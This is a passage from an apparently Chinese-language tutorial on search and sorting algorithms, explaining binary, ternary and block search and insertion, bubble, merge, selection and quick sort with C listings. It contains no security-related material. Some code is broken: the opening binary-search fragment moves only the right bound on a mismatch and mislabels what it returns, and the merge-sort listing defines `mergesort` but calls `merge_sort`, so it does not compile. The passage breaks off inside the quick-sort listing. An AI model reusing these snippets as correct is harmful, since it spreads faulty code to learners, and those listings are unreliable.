class="hljs-keyword">int</span> <span class="hljs-title">search</span><span class="hljs-params">(<span class="hljs-keyword">int</span> *data, <span class="hljs-keyword">int</span> length, <span class="hljs-keyword">int</span> value)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> left = <span class="hljs-number">-1</span>, right = length - <span class="hljs-number">1</span>;  <span class="hljs-comment">// left = -1 处理不存在目标情况</span><br>    <span class="hljs-keyword">while</span> (left &lt; right) &#123;<br>        <span class="hljs-keyword">int</span> mid = (left + right + <span class="hljs-number">1</span>) / <span class="hljs-number">2</span>;  <span class="hljs-comment">// 保证left不会恒定为一个值，所以 + 1</span><br>        <span class="hljs-keyword">if</span> (data[mid] == value) &#123;<br>            left = mid; <span class="hljs-comment">// 收缩到第一个出现位置</span><br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            right = mid - <span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> left;  <span class="hljs-comment">// 不存在返回 -1</span><br>&#125;<br></code></pre></div></td></tr></table></figure><h3><span id="三分查找">三分查找</span></h3><p>适合序列具有凸性的情况，某一点两侧分别是单调的。</p><ol type="1"><li>首先将区间 <span class="math inline">\([L, R]\)</span>平均分成三部分：<span class="math inline">\([L, m_1]\)</span>、<span class="math inline">\([m_1, m_2]\)</span>、<span class="math inline">\([m_2, R]\)</span>。</li><li>计算三等分点 <span class="math inline">\(m_1\)</span> 和 <span class="math inline">\(m_2\)</span> 对应的函数值 <span class="math inline">\(f(m_1)\)</span> 和 <span class="math inline">\(f(m_2)\)</span>。</li><li>比较 <span class="math inline">\(f(m_1)\)</span> 和 <span class="math inline">\(f(m_2)\)</span> 的大小。 如果 <span class="math inline">\(f(m_1) &gt; f(m_2)\)</span>，则说明点 <span class="math inline">\(T\)</span> 一定不在区间 <span class="math inline">\([m_2, R]\)</span> 内，可以把右边界 <span class="math inline">\(R\)</span> 更新成 <span class="math inline">\(m_2\)</span>； 如果 <span class="math inline">\(f(m_1) &lt; f(m_2)\)</span>，则说明点 <span class="math inline">\(T\)</span> 一定不在区间 <span class="math inline">\([L, m_1]\)</span> 内，可以把左边界 <span class="math inline">\(L\)</span> 更新成 <span class="math inline">\(m_1\)</span>； 如果 <span class="math inline">\(f(m_1) = f(m_2)\)</span>，则说明点 <span class="math inline">\(T\)</span> 一定落在区间 <span class="math inline">\([m_1, m_2]\)</span>内。另外，可以将这种情况归为上面两种情况的任一一种。</li><li>重复以上操作，不断缩小查找区间，直到在精度要求的范围内，左边界 <span class="math inline">\(L\)</span> 等于右边界 <span class="math inline">\(R\)</span>，这时的边界点 <span class="math inline">\((L, f(L))\)</span> 或者 <span class="math inline">\((R, f(R))\)</span> 即是查找的极大值点 <span class="math inline">\(T\)</span>。</li></ol><p>同理，如果求凹性函数的极小值点，只需要在第三步中，将大于号和小于号反向变化一下即可。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">find_max</span><span class="hljs-params">(<span class="hljs-keyword">int</span> *data, <span class="hljs-keyword">int</span> length)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> left = <span class="hljs-number">0</span>, right = length - <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">while</span> (right - left &gt;= <span class="hljs-number">2</span>) &#123;<br>        <span class="hljs-keyword">int</span> m1 = left + (right - left) / <span class="hljs-number">3</span>;<br>        <span class="hljs-keyword">int</span> m2 = right - (right - left + <span class="hljs-number">2</span>) / <span class="hljs-number">3</span>;<br>        <span class="hljs-keyword">if</span> (data[m1] &gt;= data[m2]) &#123;<br>            right = m2;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            left = m1 + <span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (data[left] &gt; data[right]) &#123;<br>        <span class="hljs-keyword">return</span> left;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> right;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> a[<span class="hljs-number">5</span>] = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">7</span>, <span class="hljs-number">5</span>, <span class="hljs-number">4</span>&#125;;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d\n"</span>, find_max(a, <span class="hljs-number">5</span>));<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3><span id="分块查找">分块查找</span></h3><p><strong>分块查找（BlockingSearch）</strong>的基本思想是将一个线性表分成若干个子表，在查找时，先确定目标元素所在的子表再在该子表中去查找它。</p><p>分块查找也被叫做 <strong>索引顺序查找</strong>，在分块查找方法中，需要建立一个 <strong>索引表</strong>。索引表中包含两类信息：关键字和指针。关键字指的每个子表中最大的关键字，指针则表示该子表中第一个元素在整个表中的下标。</p><p>分块查找要求整个线性表是分块有序的。第 <em>i</em>个子表中最大的关键字小于第 <em>i</em>+1 个子表中最小的关键字。</p><p>而在每一个子表中，元素的排列是随意的，只能通过顺序查找的方法在子表中完成最终的查找工作。</p><p>分块查找的效率是基于顺序查找和折半查找之间的。先搜索引，再顺序搜索子表。</p><p>分块查找的优势在于，由于子块中的元素是随意排序的，只要找到对应的块就能直接进行插入和删除操作，而<strong>不用大量移动其它的元素</strong>，因此它适用于线性表需要频繁的动态变化的情况。</p><p>分块查找的缺点则在于它需要一定的内存空间来存放索引表并且要求对索引表进行排序。</p><p>C++ STL中的deque就是使用这种分块的“连续”结构设计思路。</p><h2><span id="排序">排序</span></h2><p>根据算法的时间复杂度，可以将排序算法分为复杂度为 <span class="math inline">\(O(n^2),\ O(n\log(n)),\O(n)\)</span>等时间复杂度的排序算法。比如 <span class="math inline">\(O(n)\)</span> 的 基数排序（radix sort）、 <span class="math inline">\(O(n\log(n))\)</span>的归并排序、<span class="math inline">\(O(n^2)\)</span>的冒泡排序。</p><p>根据排序过程中元素是否完全保存在内存中，可以将算法分为<strong>内部排序（internal sort）</strong> 和 <strong>外部排序（externalsort）</strong> 。</p><p>对于一个排序算法，如果任意两个元素 <span class="math inline">\(a_i\)</span> 和 <span class="math inline">\(a_j\)</span> 在排序前的线性表中满足条件<em>i</em>&lt;<em>j</em> 且 <span class="math inline">\(a_i =a_j\)</span>，在排序后 <span class="math inline">\(a_i\)</span> 仍在<span class="math inline">\(a_j\)</span> 之前，则称这个排序算法为<strong>稳定排序（stable sort）</strong>(比如插入、冒泡、归并)，否则称这个排序算法为 <strong>不稳定排序(unstablesort)</strong> （选择、快速、堆、希尔排序）。</p><h3><span id="插入排序">插入排序</span></h3><p>将线性表分为已排序的前半部分和待排序的后半部分，从待排序部分选出第一个元素，插入到已排序部分的对应位置中，直到全部记录都插入到已排序部分中。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">swap</span><span class="hljs-params">(<span class="hljs-keyword">int</span> *a, <span class="hljs-keyword">int</span> *b)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> temp = *a;<br>    *a = *b;<br>    *b = temp;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-keyword">int</span> *data, <span class="hljs-keyword">int</span> length)</span> </span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; length; ++i) &#123;<br>        <span class="hljs-keyword">if</span> (i &gt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">" "</span>);<br>        &#125;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d"</span>, data[i]);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n"</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sort</span><span class="hljs-params">(<span class="hljs-keyword">int</span> *data, <span class="hljs-keyword">int</span> length)</span> </span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; length; ++i) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = i - <span class="hljs-number">1</span>; j &gt;= <span class="hljs-number">0</span>; --j) &#123;<br>            <span class="hljs-keyword">if</span> (data[j] &gt; data[j + <span class="hljs-number">1</span>]) &#123;<br>                swap(&amp;data[j], &amp;data[j + <span class="hljs-number">1</span>]);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sort_better</span><span class="hljs-params">(<span class="hljs-keyword">int</span> *data, <span class="hljs-keyword">int</span> length)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> cur;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt; length; i++) &#123;<br>        cur = data[i];<br>        <span class="hljs-keyword">int</span> j = i - <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">while</span> (j &gt;= <span class="hljs-number">0</span> &amp;&amp; data[j] &gt; cur) &#123;<br>            data[j + <span class="hljs-number">1</span>] = data[j];<br>            j--;<br>        &#125;<br>        data[j + <span class="hljs-number">1</span>] = cur;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> n;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%d"</span>, &amp;n);<br>    <span class="hljs-keyword">int</span> arr[n];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; ++i) &#123;<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%d"</span>, &amp;arr[i]);<br>    &#125;<br>    sort(arr, n);<br>    <span class="hljs-built_in">print</span>(arr, n);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3><span id="冒泡排序">冒泡排序</span></h3><p>从前往后两两比较相邻元素的关键字，按照目标大小顺序进行交换元素，每趟交换以后最后一个元素一定是最大的，不再参与下一趟交换。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">swap</span><span class="hljs-params">(<span class="hljs-keyword">int</span> *a, <span class="hljs-keyword">int</span> *b)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> temp = *a;<br>    *a = *b;<br>    *b = temp;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-keyword">int</span> *data, <span class="hljs-keyword">int</span> length)</span> </span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; length; ++i) &#123;<br>        <span class="hljs-keyword">if</span> (i &gt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">" "</span>);<br>        &#125;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d"</span>, data[i]);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n"</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sort</span><span class="hljs-params">(<span class="hljs-keyword">int</span> *data, <span class="hljs-keyword">int</span> length)</span> </span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; length - <span class="hljs-number">1</span>; ++i) &#123;<br>        <span class="hljs-keyword">int</span> swapped = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; length - i - <span class="hljs-number">1</span>; ++j) &#123;<br>            <span class="hljs-keyword">if</span> (data[j] &gt; data[j + <span class="hljs-number">1</span>]) &#123;<br>                swap(&amp;data[j], &amp;data[j + <span class="hljs-number">1</span>]);<br>                swapped = <span class="hljs-number">1</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (swapped == <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sort_better</span><span class="hljs-params">(<span class="hljs-keyword">int</span> *data, <span class="hljs-keyword">int</span> len)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> isSorted = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">do</span> &#123;<br>        isSorted = <span class="hljs-number">1</span>;<br>        len--;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>; i&lt;len; ++i) &#123;<br>            <span class="hljs-keyword">if</span> (data[i] &gt; data[i+<span class="hljs-number">1</span>]) &#123;<br>                isSorted = <span class="hljs-number">0</span>;<br>                swap(&amp;data[i], &amp;data[i+<span class="hljs-number">1</span>]);<br>            &#125;<br>        &#125;<br>    &#125; <span class="hljs-keyword">while</span> (!isSorted);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> n;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%d"</span>, &amp;n);<br>    <span class="hljs-keyword">int</span> arr[n];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; ++i) &#123;<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%d"</span>, &amp;arr[i]);<br>    &#125;<br>    sort(arr, n);<br>    <span class="hljs-built_in">print</span>(arr, n);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3><span id="归并排序">归并排序</span></h3><p>设法将两个有序的线性表组合成一个新的有序线性表。为了实现归并操作，每次合并都需要开辟额外的空间来临时保存合并后的排序结果，总共需要开辟<em>n</em> 个元素的空间，所以归并排序的空间复杂度为 <span class="math inline">\(O(n)\)</span>。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">swap</span><span class="hljs-params">(<span class="hljs-keyword">int</span> *a, <span class="hljs-keyword">int</span> *b)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> temp = *a;<br>    *a = *b;<br>    *b = temp;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-keyword">int</span> *data, <span class="hljs-keyword">int</span> length)</span> </span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; length; ++i) &#123;<br>        <span class="hljs-keyword">if</span> (i &gt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">" "</span>);<br>        &#125;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d"</span>, data[i]);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n"</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">mergesort</span><span class="hljs-params">(<span class="hljs-keyword">int</span> *data, <span class="hljs-keyword">int</span> l, <span class="hljs-keyword">int</span> r)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (l == r) <span class="hljs-keyword">return</span>;<br>    <span class="hljs-keyword">int</span> mid = (l + r) / <span class="hljs-number">2</span>;<br>    mergesort(data, l, mid);<br>    mergesort(data, mid + <span class="hljs-number">1</span>, r);<br><br>    <span class="hljs-keyword">int</span> temp[r - l + <span class="hljs-number">1</span>]; <span class="hljs-comment">// 或者从堆分配空间</span><br>    <span class="hljs-keyword">int</span> x = l, y = mid + <span class="hljs-number">1</span>, loc = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (x &lt;= mid || y &lt;= r) &#123;<br>        <span class="hljs-keyword">if</span> (x &lt;= mid &amp;&amp; (y &gt; r || data[x] &lt;= data[y])) <br>            temp[loc] = data[x++];<br>        <span class="hljs-keyword">else</span><br>            temp[loc] = data[y++];<br>        loc++;<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = l; i &lt;= r; i++) &#123;<br>        data[i] = temp[i - l];<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> n;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%d"</span>, &amp;n);<br>    <span class="hljs-keyword">int</span> arr[n];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; ++i) &#123;<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%d"</span>, &amp;arr[i]);<br>    &#125;<br>    merge_sort(arr, <span class="hljs-number">0</span>, n - <span class="hljs-number">1</span>);<br>    <span class="hljs-built_in">print</span>(arr, n);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3><span id="选择排序">选择排序</span></h3><p>选择排序，每趟从线性表的待排序区域选取关键字最小的元素，将其放到已排序区域的最后。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-keyword">void</span> <span class="hljs-title">swap</span><span class="hljs-params">(<span class="hljs-keyword">int</span> *a, <span class="hljs-keyword">int</span> *b)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> temp = *a;<br>    *a = *b;<br>    *b = temp;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-keyword">int</span> *data, <span class="hljs-keyword">int</span> length)</span> </span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; length; ++i) &#123;<br>        <span class="hljs-keyword">if</span> (i &gt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">" "</span>);<br>        &#125;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d"</span>, data[i]);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n"</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sort</span><span class="hljs-params">(<span class="hljs-keyword">int</span> *data, <span class="hljs-keyword">int</span> length)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> temp;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; length - <span class="hljs-number">1</span>; ++i) &#123;<br>        temp = i;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = i + <span class="hljs-number">1</span>; j &lt; length; ++j) &#123;<br>            <span class="hljs-keyword">if</span> (data[temp] &gt; data[j]) &#123;<br>                temp = j;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (i != temp) &#123;<br>            swap(&amp;data[i], &amp;data[temp]);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sort_better</span><span class="hljs-params">(<span class="hljs-keyword">int</span> *data, <span class="hljs-keyword">int</span> len)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (len &lt;= <span class="hljs-number">1</span>) <span class="hljs-keyword">return</span>;<br>    <span class="hljs-keyword">register</span> <span class="hljs-keyword">int</span> *last = data + len - <span class="hljs-number">1</span>,<br>     *p,<br>     *minPtr;<br>    <span class="hljs-keyword">for</span> ( ; data &lt; last; ++data) &#123;<br>        minPtr = data;<br>        <span class="hljs-keyword">for</span> (p = data + <span class="hljs-number">1</span>; p &lt;= last; ++p) &#123;<br>            <span class="hljs-keyword">if</span> (*p &lt; *minPtr) minPtr = p;<br>        &#125;<br>        swap(minPtr, data);<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> n;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%d"</span>, &amp;n);<br>    <span class="hljs-keyword">int</span> arr[n];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; ++i) &#123;<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%d"</span>, &amp;arr[i]);<br>    &#125;<br>    sort(arr, n);<br>    <span class="hljs-built_in">print</span>(arr, n);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>在每次查找关键字最小的元素时，可以使用堆对效率进行优化，使用堆来优化的选择排序就是堆排序。</p><h3><span id="快速排序">快速排序</span></h3><p>快速排序是目前应用最广泛的排序算法之一。它的基本思想是，每次从待排序区间选取一个元素（在后面的课程中都是选取第一个）作为基准记录，所有比基准记录小的元素都在基准记录的左边，而所有比基准记录大的元素都在基准记录的右边。之后分别对基准记录的左边和右边两个区间进行快速排序，直至将整个线性表排序完成。</p><p>quick_sort_better 实现了单边递归，将两个递归函数，优化成一个。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span 